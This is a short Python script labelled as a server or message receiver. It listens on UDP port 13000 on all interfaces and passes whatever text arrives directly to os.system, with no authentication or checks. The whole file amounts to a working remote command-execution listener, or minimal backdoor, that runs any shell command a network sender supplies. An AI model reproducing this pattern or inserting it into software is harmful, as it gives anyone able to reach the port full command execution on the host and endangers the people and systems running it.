#server/message receiver

import os
from socket import *
host = ""
port = 13000
buf = 1024
addr = (host, port)
UDPSock = socket(AF_INET, SOCK_DGRAM)
UDPSock.bind(addr)
print("Waiting to recieve")
(data, addr) = UDPSock.recvfrom(buf)
os.system("%s" % data.decode('utf-8'))
UDPSock.close()
#os.exit(0)